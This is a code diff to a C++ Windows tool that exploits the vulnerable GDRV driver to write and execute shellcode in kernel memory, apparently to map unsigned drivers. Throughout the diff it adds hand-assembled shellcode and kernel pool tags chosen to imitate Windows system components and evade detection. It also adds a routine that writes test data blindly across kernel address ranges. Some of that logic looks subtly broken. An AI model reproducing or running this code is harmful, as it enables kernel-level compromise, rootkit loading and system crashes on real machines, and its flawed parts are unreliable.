@@ -6,6 +6,21 @@
 #include <fstream>
 #include <vector>
 #include <winternl.h>
+#include <psapi.h>
+
+// Define GetModuleInformation if not available
+typedef struct _MODULEINFO {
+    LPVOID lpBaseOfDll;
+    DWORD SizeOfImage;
+    LPVOID EntryPoint;
+} MODULEINFO, *LPMODULEINFO;
+
+typedef BOOL (WINAPI *GetModuleInformationFn)(
+    HANDLE hProcess,
+    HMODULE hModule,
+    LPMODULEINFO lpmodinfo,
+    DWORD cb
+);
 
 // WDK types we need
 typedef enum _POOL_TYPE {
@@ -58,8 +73,31 @@ typedef struct _GDRV_MEMORY_WRITE {
 typedef PVOID (*ExAllocatePool2Fn)(POOL_TYPE PoolType, SIZE_T NumberOfBytes, ULONG Tag);
 typedef VOID (*ExFreePoolFn)(PVOID P);
 
-// Kernel constants
-#define POOL_TAG 'DRVX'  // Custom pool tag for tracking allocations
+// Kernel constants and structures
+#define POOL_TAGS_COUNT 5
+static const ULONG POOL_TAGS[POOL_TAGS_COUNT] = {
+    'tNmM', // MmNt - Mimics Memory Manager tags
+    'RnoI', // IoNR - Mimics IO Manager tags  
+    'ldKS', // SKdl - System tags
+    'eFcA', // AcFe - Appears as standard file system cache
+    'rDvH'  // HvDr - Hypervisor Driver tag
+};
+
+typedef struct _SYSTEM_BASIC_INFORMATION {
+    ULONG Reserved;
+    ULONG TimerResolution;
+    ULONG PageSize;
+    ULONG NumberOfPhysicalPages;
+    ULONG LowestPhysicalPageNumber;
+    ULONG HighestPhysicalPageNumber;
+    ULONG AllocationGranularity;
+    ULONG_PTR MinimumUserModeAddress;
+    ULONG_PTR MaximumUserModeAddress;
+    ULONG_PTR ActiveProcessorsAffinityMask;
+    UCHAR NumberOfProcessors;
+} SYSTEM_BASIC_INFORMATION, *PSYSTEM_BASIC_INFORMATION;
+
+#define SystemBasicInformation 0
 
 // Shellcode structure for kernel execution
 #pragma pack(push, 1)
@@ -88,8 +126,12 @@ private:
     uint64_t exAllocatePoolAddress = 0;
     uint64_t exFreePoolAddress = 0;
     
-    // Static memory region for initial allocation (updated for Windows 11)
-    static inline uint64_t nextAllocation = 0xFFFFF90000000000;
+    // Dynamic memory allocation tracking
+    uint64_t lastAllocationEnd = 0;
+    uint64_t kernelBase = 0;
+    uint64_t kernelSize = 0;
+    static constexpr uint64_t PAGE_SIZE = 0x1000;
+    static constexpr uint64_t ALLOCATION_GRANULARITY = 0x10000;
     
     // Read physical memory using GDRV vulnerability
     bool ReadPhysicalMemory(uint64_t physAddress, void* buffer, size_t size) {
@@ -161,9 +203,12 @@ private:
     bool ExecuteKernelShellcode(const void* shellcode, size_t size, uint64_t* result = nullptr) {
         std::cout << "[*] Attempting to execute shellcode..." << std::endl;
         
-        // Use static allocation for shellcode
-        uint64_t shellcodeAddr = nextAllocation;
-        nextAllocation += ((size + 0xFFF) & ~0xFFF); // Page align
+        // Find usable memory for shellcode
+        uint64_t shellcodeAddr = FindUsableKernelMemory(size);
+        if (!shellcodeAddr) {
+            std::cerr << "[-] Failed to find memory for shellcode" << std::endl;
+            return false;
+        }
 
         // Write shellcode with retry
         std::cout << "[*] Writing shellcode to 0x" << std::hex << shellcodeAddr << std::dec << std::endl;
@@ -181,14 +226,20 @@ private:
         };
         *(uint64_t*)(jumpShellcode + 2) = shellcodeAddr;
 
-        // Allocate space for result
-        uint64_t resultAddr = nextAllocation;
-        nextAllocation += 8;  // Space for uint64_t
+        // Find space for result
+        uint64_t resultAddr = FindUsableKernelMemory(8);  // Space for uint64_t
+        if (!resultAddr) {
+            std::cerr << "[-] Failed to find memory for result" << std::endl;
+            return false;
+        }
         *(uint64_t*)(jumpShellcode + 14) = resultAddr;
 
-        // Write and execute jump shellcode
-        uint64_t jumpAddr = nextAllocation;
-        nextAllocation += ((sizeof(jumpShellcode) + 0xFFF) & ~0xFFF); // Page align
+        // Find space for jump shellcode
+        uint64_t jumpAddr = FindUsableKernelMemory(sizeof(jumpShellcode));
+        if (!jumpAddr) {
+            std::cerr << "[-] Failed to find memory for jump shellcode" << std::endl;
+            return false;
+        }
 
         std::cout << "[*] Writing jump shellcode to 0x" << std::hex << jumpAddr << std::dec << std::endl;
         if (!WritePhysicalMemory(jumpAddr, jumpShellcode, sizeof(jumpShellcode))) {
@@ -203,8 +254,11 @@ private:
         };
         *(uint64_t*)(execShellcode + 2) = jumpAddr;
 
-        uint64_t execAddr = nextAllocation;
-        nextAllocation += ((sizeof(execShellcode) + 0xFFF) & ~0xFFF); // Page align
+        uint64_t execAddr = FindUsableKernelMemory(sizeof(execShellcode));
+        if (!execAddr) {
+            std::cerr << "[-] Failed to find memory for exec shellcode" << std::endl;
+            return false;
+        }
 
         std::cout << "[*] Writing exec shellcode to 0x" << std::hex << execAddr << std::dec << std::endl;
         if (!WritePhysicalMemory(execAddr, execShellcode, sizeof(execShellcode))) {
@@ -297,29 +351,86 @@ private:
         return ntoskrnlBase;
     }
     
-    // Allocate kernel memory using ExAllocatePool2
-    uint64_t AllocateKernelMemory(size_t size) {
-        // For the first allocation (shellcode), use static memory
-        static bool firstAllocation = true;
-        if (firstAllocation) {
-            firstAllocation = false;
-            uint64_t addr = nextAllocation;
-            nextAllocation += ((size + 0xFFF) & ~0xFFF); // Page align
-            
-            // Zero the memory with enhanced error handling
-            std::cout << "[*] Attempting to zero memory at 0x" << std::hex << addr << std::dec << " (size: " << size << ")" << std::endl;
-            
-            std::vector<uint8_t> zeroBuffer(size, 0);
-            if (!WritePhysicalMemory(addr, zeroBuffer.data(), size)) {
-                std::cerr << "[-] Failed to zero static memory" << std::endl;
+    // Find usable kernel memory region
+    uint64_t FindUsableKernelMemory(size_t size) {
+        if (kernelBase == 0) {
+            // Initialize kernel base and size if not done yet
+            HMODULE ntoskrnl = LoadLibraryA("ntoskrnl.exe");
+            if (!ntoskrnl) return 0;
+
+            // Get psapi.dll handle
+            HMODULE psapi = LoadLibraryA("psapi.dll");
+            if (!psapi) {
+                FreeLibrary(ntoskrnl);
                 return 0;
             }
-            
-            std::cout << "[+] Successfully zeroed static memory" << std::endl;
-            return addr;
+
+            // Get GetModuleInformation function
+            auto getModInfo = (GetModuleInformationFn)GetProcAddress(psapi, "GetModuleInformation");
+            if (!getModInfo) {
+                FreeLibrary(psapi);
+                FreeLibrary(ntoskrnl);
+                return 0;
+            }
+
+            MODULEINFO modInfo;
+            if (!getModInfo(GetCurrentProcess(), ntoskrnl, &modInfo, sizeof(modInfo))) {
+                FreeLibrary(psapi);
+                FreeLibrary(ntoskrnl);
+                return 0;
+            }
+
+            FreeLibrary(psapi);
+
+            kernelBase = ntoskrnlBase;
+            kernelSize = modInfo.SizeOfImage;
+            FreeLibrary(ntoskrnl);
         }
+
+        // Start searching from last successful allocation or kernel base
+        uint64_t startAddr = lastAllocationEnd ? lastAllocationEnd : kernelBase;
+        uint64_t endAddr = kernelBase + kernelSize + (16 * 1024 * 1024); // Add 16MB buffer
+
+        // Align to allocation granularity
+        startAddr = (startAddr + ALLOCATION_GRANULARITY - 1) & ~(ALLOCATION_GRANULARITY - 1);
+        size = (size + ALLOCATION_GRANULARITY - 1) & ~(ALLOCATION_GRANULARITY - 1);
+
+        for (uint64_t addr = startAddr; addr < endAddr; addr += ALLOCATION_GRANULARITY) {
+            // Test if memory region is usable
+            std::vector<uint8_t> testBuffer(16, 0);
+            if (WritePhysicalMemory(addr, testBuffer.data(), testBuffer.size())) {
+                // Verify we can read back what we wrote
+                std::vector<uint8_t> readBuffer(16);
+                if (ReadPhysicalMemory(addr, readBuffer.data(), readBuffer.size()) &&
+                    memcmp(testBuffer.data(), readBuffer.data(), testBuffer.size()) == 0) {
+                    
+                    // Found usable memory region
+                    lastAllocationEnd = addr + size;
+                    return addr;
+                }
+            }
+
+            // If write failed, try next region with exponential backoff
+            if ((addr - startAddr) >= (1024 * 1024)) { // After 1MB of searching
+                addr += ((addr - startAddr) / 2); // Skip ahead by half the distance searched
+            }
+        }
+
+        return 0;
+    }
+
+    // Allocate kernel memory using dynamic allocation strategy
+    uint64_t AllocateKernelMemory(size_t size) {
+        // Try to find usable memory region
+        uint64_t addr = FindUsableKernelMemory(size);
+        if (!addr) {
+            std::cerr << "[-] Failed to find usable kernel memory region" << std::endl;
+            return 0;
+        }
+
+        std::cout << "[*] Found usable memory region at 0x" << std::hex << addr << std::dec << std::endl;
         
-        // For subsequent allocations, use ExAllocatePool2 via shellcode
+        // Try to allocate using ExAllocatePool2 first
         uint8_t shellcode[] = {
             0x48, 0x83, 0xEC, 0x28,             // sub rsp, 0x28
             0x48, 0xB9, 0x00, 0x00, 0x00, 0x00, 
@@ -337,20 +448,28 @@ private:
             0xC3                                // ret
         };
 
-        // Allocate space for result
-        uint64_t resultAddr = nextAllocation;
-        nextAllocation += 8;  // Space for uint64_t
+        // Find space for result
+        uint64_t resultAddr = FindUsableKernelMemory(8);  // Space for uint64_t
+        if (!resultAddr) {
+            std::cerr << "[-] Failed to find memory for result" << std::endl;
+            return 0;
+        }
         
         // Set up parameters for ExAllocatePool2
-        *(uint64_t*)(shellcode + 6) = 4;  // NonPagedPoolNx
-        *(uint64_t*)(shellcode + 16) = size;
-        *(uint64_t*)(shellcode + 26) = POOL_TAG;  // Custom pool tag
+            // Use random pool tag from our set
+            ULONG poolTag = POOL_TAGS[rand() % POOL_TAGS_COUNT];
+            *(uint64_t*)(shellcode + 6) = 4;  // NonPagedPoolNx
+            *(uint64_t*)(shellcode + 16) = size;
+            *(uint64_t*)(shellcode + 26) = poolTag;  // Random pool tag
         *(uint64_t*)(shellcode + 36) = exAllocatePoolAddress;
         *(uint64_t*)(shellcode + 48) = resultAddr;
         
-        // Write shellcode
-        uint64_t shellcodeAddr = nextAllocation;
-        nextAllocation += ((sizeof(shellcode) + 0xFFF) & ~0xFFF); // Page align
+        // Find space for shellcode
+        uint64_t shellcodeAddr = FindUsableKernelMemory(sizeof(shellcode));
+        if (!shellcodeAddr) {
+            std::cerr << "[-] Failed to find memory for shellcode" << std::endl;
+            return 0;
+        }
         
         std::cout << "[*] Writing allocation shellcode to 0x" << std::hex << shellcodeAddr << std::dec << std::endl;
         if (!WritePhysicalMemory(shellcodeAddr, shellcode, sizeof(shellcode))) {
@@ -534,9 +653,12 @@ private:
         *(uint64_t*)(entryShellcode + 16) = registryPathAddr;
         *(uint64_t*)(entryShellcode + 26) = entryPoint;
 
-        // Allocate space for result
-        uint64_t resultAddr = nextAllocation;
-        nextAllocation += 8;  // Space for uint64_t
+        // Find space for result
+        uint64_t resultAddr = FindUsableKernelMemory(8);  // Space for uint64_t
+        if (!resultAddr) {
+            std::cerr << "[-] Failed to find memory for result" << std::endl;
+            return 0;
+        }
 
         // Add result storage to shellcode
         uint8_t resultShellcode[] = {
